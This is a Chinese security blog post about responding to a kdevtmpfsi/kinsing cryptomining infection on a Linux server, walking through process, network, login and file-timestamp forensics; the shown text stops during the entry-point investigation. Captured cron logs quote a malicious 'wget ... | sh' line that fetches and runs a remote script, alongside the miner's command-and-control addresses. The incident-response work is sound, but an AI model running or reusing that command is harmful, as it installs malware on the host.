@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>一次应急挖矿木马 | lufei&#39;s blog</title>
+  <meta name="description" content="前言朋友的Linux服务器很早就被挖矿了，但是他很懒，也很忙，搁置不管。笔者最近加入腾讯安全应急响应中心，由于工作内容的变化，最近想加强下入侵应急排查能力，借它练练手，顺便帮朋友清理一下。 基本信息首先使用top命令查看一下 125478 root      20   0  712512   1452    724 S 49.2  0.1  13895:27 kdevtmpfsi  确认kdevt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次应急挖矿木马">
+<meta property="og:url" content="https://lufe1.cn/2020/07/28/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:site_name" content="lufei&#39;s blog">
+<meta property="og:description" content="前言朋友的Linux服务器很早就被挖矿了，但是他很懒，也很忙，搁置不管。笔者最近加入腾讯安全应急响应中心，由于工作内容的变化，最近想加强下入侵应急排查能力，借它练练手，顺便帮朋友清理一下。 基本信息首先使用top命令查看一下 125478 root      20   0  712512   1452    724 S 49.2  0.1  13895:27 kdevtmpfsi  确认kdevt">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.lufe1.cn/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/1.png">
+<meta property="og:image" content="https://image.lufe1.cn/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/2.png">
+<meta property="article:published_time" content="2020-07-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-02T16:06:17.038Z">
+<meta property="article:author" content="lufei@湘ICP备17016147号-1">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.lufe1.cn/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/1.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://lufe1.cn/2020/07/28/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="lufei&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/lufeirider" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">lufei</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">网络安全</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81/">代码</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%8D%E6%9D%80/">免杀</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/">原创工具</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/">工具修改</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">恶意代码分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E5%B7%A7/">技巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8C%96%E6%B4%9E/">挖洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90/">权限</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%B1%E5%A3%B3/">脱壳</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%98%B2%E5%BE%A1/">防御</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81/" rel="tag">代码</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/" rel="tag">原创工具</a><span class="tag-list-count">25</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/" rel="tag">工具修改</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" rel="tag">恶意代码分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%96%E6%B4%9E/" rel="tag">挖洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90/" rel="tag">权限</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3/" rel="tag">脱壳</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%98%B2%E5%BE%A1/" rel="tag">防御</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-一次应急挖矿木马" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      一次应急挖矿木马
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/07/28/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/" class="article-date">
+	  <time datetime="2020-07-27T16:00:00.000Z" itemprop="datePublished">2020-07-28</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/07/28/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>朋友的Linux服务器很早就被挖矿了，但是他很懒，也很忙，搁置不管。笔者最近加入腾讯安全应急响应中心，由于工作内容的变化，最近想加强下入侵应急排查能力，借它练练手，顺便帮朋友清理一下。</p>
+<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>首先使用top命令查看一下<br><img src="https://image.lufe1.cn/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/1.png" alt=" &#39;1.png&#39;"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25478 root      20   0  712512   1452    724 S 49.2  0.1  13895:27 kdevtmpfsi</span><br></pre></td></tr></table></figure>
+
+<p>确认kdevtmpfsi就是挖矿木马，并且拿到了root权限，接下来看看植入时间。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu# lsof -p 25478</span><br><span class="line">COMMAND     PID USER   FD      TYPE    DEVICE SIZE/OFF      NODE NAME</span><br><span class="line">kdevtmpfs 25478 root  cwd       DIR     253,1     4096         2 /</span><br><span class="line">kdevtmpfs 25478 root  rtd       DIR     253,1     4096         2 /</span><br><span class="line">kdevtmpfs 25478 root  txt       REG     253,1  3922304    436672 /tmp/kdevtmpfsi</span><br><span class="line">kdevtmpfs 25478 root  DEL       REG      0,15           78487503 /anon_hugepage</span><br><span class="line">kdevtmpfs 25478 root  DEL       REG      0,15          106038154 /anon_hugepage</span><br><span class="line">kdevtmpfs 25478 root    0r      CHR       1,3      0t0         6 /dev/null</span><br><span class="line">kdevtmpfs 25478 root    1u      REG     253,1        5    575025 /tmp/.ICEd-unix/330108689 (deleted)</span><br><span class="line">kdevtmpfs 25478 root    2w      CHR       1,3      0t0         6 /dev/null</span><br><span class="line">kdevtmpfs 25478 root    3r      DIR     253,1     4096         2 /</span><br><span class="line">kdevtmpfs 25478 root    4r     FIFO      0,10      0t0  78487493 pipe</span><br><span class="line">kdevtmpfs 25478 root    5w     FIFO      0,10      0t0  78487493 pipe</span><br><span class="line">kdevtmpfs 25478 root    6u  a_inode      0,11        0      6978 [eventpoll]</span><br><span class="line">kdevtmpfs 25478 root    7r     FIFO      0,10      0t0  78487494 pipe</span><br><span class="line">kdevtmpfs 25478 root    8w     FIFO      0,10      0t0  78487494 pipe</span><br><span class="line">kdevtmpfs 25478 root    9u  a_inode      0,11        0      6978 [eventfd]</span><br><span class="line">kdevtmpfs 25478 root   10r      CHR       1,3      0t0         6 /dev/null</span><br><span class="line">kdevtmpfs 25478 root   11u     sock       0,8      0t0 101725910 protocol: TCP</span><br><span class="line">kdevtmpfs 25478 root   12u     sock       0,8      0t0 101726121 protocol: TCP</span><br><span class="line">kdevtmpfs 25478 root   13u     IPv4 106194697      0t0       TCP 172.21.0.11:36390-&gt;193.33.87.219:http (ESTABLISHED)</span><br></pre></td></tr></table></figure>
+
+<p>查看文件时间，一般这个时间都是不靠谱的，因为可以自己进行修改时间戳。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu# ls -al /tmp/kdevtmpfsi</span><br><span class="line">-rwxr-xr-x 1 root root 3922304 Jun 17 06:26 /tmp/kdevtmpfsi</span><br></pre></td></tr></table></figure>
+
+<p>这里它还启动了服务，查看服务的时间，2020-04-18 22:16:06，服务时间一般比较靠谱。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu# systemctl status 25478</span><br><span class="line">● cron.service - Regular background program processing daemon</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since Sat 2020-04-18 22:16:06 CST; 2 months 18 days ago</span><br><span class="line">     Docs: man:cron(8)</span><br><span class="line"> Main PID: 1225 (cron)</span><br><span class="line">   CGroup: /system.slice/cron.service</span><br><span class="line">           ├─ 1225 /usr/sbin/cron -f</span><br><span class="line">           ├─ 2109 /usr/local/safe//agent -d</span><br><span class="line">           ├─ 2122 barad_agent                                </span><br><span class="line">           ├─ 2123 barad_agent                                </span><br><span class="line">           ├─ 2124 barad_agent                                </span><br><span class="line">           ├─16834 /bin/sh -c ntpdate -b -d update.yun.com 2&gt;&amp;1 | grep &#x27;step time server&#x27; | sed -r &#x27;s/.*offset(.*)sec.*/\1/&#x27;</span><br><span class="line">           ├─16835 ntpdate -b -d update.yun.com</span><br><span class="line">           ├─16836 grep step time server</span><br><span class="line">           ├─16837 sed -r s/.*offset(.*)sec.*/\1/</span><br><span class="line">           ├─17951 /var/tmp/kinsing</span><br><span class="line">           └─25478 /tmp/kdevtmpfsi</span><br><span class="line"></span><br><span class="line">Jul 07 00:11:01 ubuntu CRON[16676]: (root) CMD (/usr/local/safe//start.sh &gt; /dev/null 2&gt;&amp;1 &amp;)</span><br><span class="line">Jul 07 00:11:01 ubuntu CRON[16677]: (root) CMD (wget -q -O - http://195.3.146.118/s.sh | sh &gt; /dev/null 2&gt;&amp;1)</span><br><span class="line">Jul 07 00:11:01 ubuntu CRON[16675]: pam_unix(cron:session): session closed for user root</span><br><span class="line">Jul 07 00:11:01 ubuntu CRON[16674]: pam_unix(cron:session): session closed for user root</span><br><span class="line">Jul 07 00:12:01 ubuntu CRON[16817]: pam_unix(cron:session): session opened for user root by (uid=0)</span><br><span class="line">Jul 07 00:12:01 ubuntu CRON[16816]: pam_unix(cron:session): session opened for user root by (uid=0)</span><br><span class="line">Jul 07 00:12:01 ubuntu CRON[16818]: (root) CMD (wget -q -O - http://195.3.146.118/s.sh | sh &gt; /dev/null 2&gt;&amp;1)</span><br><span class="line">Jul 07 00:12:01 ubuntu CRON[16819]: (root) CMD (/usr/local/safe//start.sh &gt; /dev/null 2&gt;&amp;1 &amp;)</span><br><span class="line">Jul 07 00:12:01 ubuntu CRON[16817]: pam_unix(cron:session): session closed for user root</span><br><span class="line">Jul 07 00:12:02 ubuntu CRON[16816]: pam_unix(cron:session): session closed for user root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>这里要在这个时间上下扩展几天，因为可能拿到服务器，进行挖矿了，还进行其他操作，也会留下痕迹。<br>去掉<code>/sys/fs</code>、<code>/run/udev</code>、<code>/sys/kernel</code>之类开头的数据，再根据黑客的习惯，比如把程序放在tmp目录，来锁定一些文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">linux 文件的三种时间(以 find 为例):通过stat myfile命令也可查看到</span><br><span class="line">atime 最后一次访问时间, 如 less, more 等, 但 chmod, chown, ls, stat 等不会修改些时间(使用ext3文件系统的时候，如果在mount的时候使用了noatime参数那么就不会更新atime的 信息。),</span><br><span class="line">ctime 最后一次状态修改时间, 如 chmod, chown 等状态时间改变但修改时间不会改变, 使用 stat file 可以查看;</span><br><span class="line">mtime 最后一次内容修改时间, 如 vi 保存后等, 修改时间发生改变的话, atime 和 ctime 也相应跟着发生改变.</span><br><span class="line">crtime 创建时间</span><br><span class="line">ls -i ./file</span><br><span class="line">debugfs -R &#x27;stat &lt;13377&gt;&#x27; /dev/sda1</span><br></pre></td></tr></table></figure>
+
+
+<p>在确定最早的时间，往后退几天作为结束时间搜索（使用最后一次修改时间）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -newermt &#x27;2020-4-16 00:00&#x27; ! -newermt &#x27;2020-04-22 22:16&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<p>发现tmp还有挖矿的临时文件没被删除，4.21号。临时文件一般不会刻意去修改时间戳或者修改，也是比较靠谱。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# ls -al zzz</span><br><span class="line">-rwxr-xr-x 1 root root 27608 Apr 21 21:04 zzz</span><br></pre></td></tr></table></figure>
+
+<p>那大概基本信息得出了，挖掘木马4.16号或者更早拿下了服务器root权限进行cpu挖矿。</p>
+<h1 id="挖矿木马是怎么进来的？"><a href="#挖矿木马是怎么进来的？" class="headerlink" title="挖矿木马是怎么进来的？"></a>挖矿木马是怎么进来的？</h1><p>首先看看服务器开了哪些服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# netstat -atlp</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 *:http                  *:*                     LISTEN      1618/apache2   </span><br><span class="line">tcp        0      0 *:ssh                   *:*                     LISTEN      1337/sshd      </span><br><span class="line">tcp        0      0 *:smtp                  *:*                     LISTEN      1853/master    </span><br><span class="line">tcp        0      0 localhost.localdo:36356 *:*                     LISTEN      1341/containerd</span><br><span class="line">tcp        0      0 172.21.0.11:ssh         1.1.1.1:13540    ESTABLISHED 12063/sshd: ubuntu</span><br><span class="line">tcp        0      0 172.21.0.11:41626       bh63797.dnsrus.net:http ESTABLISHED 17951/kinsing  </span><br><span class="line">tcp        0      0 172.21.0.11:41680       bh63797.dnsrus.net:http ESTABLISHED 17951/kinsing  </span><br><span class="line">tcp        0      0 172.21.0.11:41358       bh63797.dnsrus.net:http TIME_WAIT   -              </span><br><span class="line">tcp        0      0 172.21.0.11:36390       193.33.87.219:http      ESTABLISHED 25478/kdevtmpfsi</span><br><span class="line">tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      1337/sshd      </span><br><span class="line">tcp6       0      0 [::]:smtp               [::]:*                  LISTEN      1853/master    </span><br><span class="line">tcp6       0      0 [::]:31111              [::]:*                  LISTEN      17951/kinsing </span><br></pre></td></tr></table></figure>
+
+<p>ssh、http、smtp，大概猜测到挖矿木马就是通过这几个服务搞进来的，但是为了严谨，不能说大概，得找实锤。不然工作应急，说大概也许，后面再被搞进来就很麻烦。</p>
+<h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p>执行lastb命令查看发现爆破倒是一大堆，而且他这个服务器密码并不是很强壮，但是登陆成功的ip都是他的历史ip，暂时排除ssh爆破进来的可能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# last</span><br><span class="line">ubuntu   pts/1        1.1.1.1   Mon Jul  6 23:51   still logged in</span><br><span class="line">ubuntu   pts/2        2.2.2.2    Mon Jul  6 17:17 - 17:18  (00:00)</span><br><span class="line">ubuntu   pts/1        2.2.2.2    Mon Jul  6 17:17 - 17:18  (00:00)</span><br><span class="line">ubuntu   pts/2        3.3.3.3    Sun Jul  5 16:57 - 18:39  (01:42)</span><br><span class="line">ubuntu   pts/1        3.3.3.3    Sun Jul  5 16:54 - 20:34  (03:39)</span><br><span class="line">ubuntu   pts/0        3.3.3.3    Sun Jul  5 11:41 - 20:34  (08:52)</span><br><span class="line">ubuntu   pts/0        3.3.3.3    Sat Jul  4 13:22 - 18:40  (05:18)</span><br><span class="line">ubuntu   pts/0        4.4.4.4  Fri Jul  3 21:28 - 21:28  (00:00)</span><br><span class="line">ubuntu   pts/1        2.2.2.2    Fri Jul  3 15:21 - 15:38  (00:17)</span><br><span class="line">ubuntu   pts/0        2.2.2.2    Fri Jul  3 15:21 - 15:38  (00:17)</span><br><span class="line">ubuntu   pts/1        2.2.2.2    Fri Jul  3 15:13 - 15:21  (00:08)</span><br><span class="line">ubuntu   pts/0        2.2.2.2    Fri Jul  3 15:13 - 15:21  (00:08)</span><br><span class="line">ubuntu   pts/1        4.4.4.4  Fri Jul  3 01:38 - 03:01  (01:22)</span><br><span class="line">ubuntu   pts/0        4.4.4.4  Fri Jul  3 01:38 - 03:01  (01:22)</span><br><span class="line">ubuntu   pts/1        4.4.4.4  Fri Jul  3 01:24 - 01:24  (00:00)</span><br><span class="line">ubuntu   pts/0        4.4.4.4  Fri Jul  3 01:24 - 01:24  (00:00)</span><br></pre></td></tr></table></figure>
+
+<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><p>他的http服务也有自己放置的后门以及自己写的有漏洞的php程序，但并不是root权限运行的，意味着挖矿木马还需要提权，我觉得挖矿木马并没有这么全自动，为了更加谨慎些，排查http攻击日志并复测攻击payload但都没有成功，暂时排除http攻击进来都可能。<br><img src="https://image.lufe1.cn/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/2.png" alt=" &#39;2.png&#39;"></p>
+<h4 id="stmp"><a href="#stmp" class="headerlink" title="stmp"></a>stmp</h4><p>暂未发现有公开stmp rce漏洞，所以也暂时排除。</p>
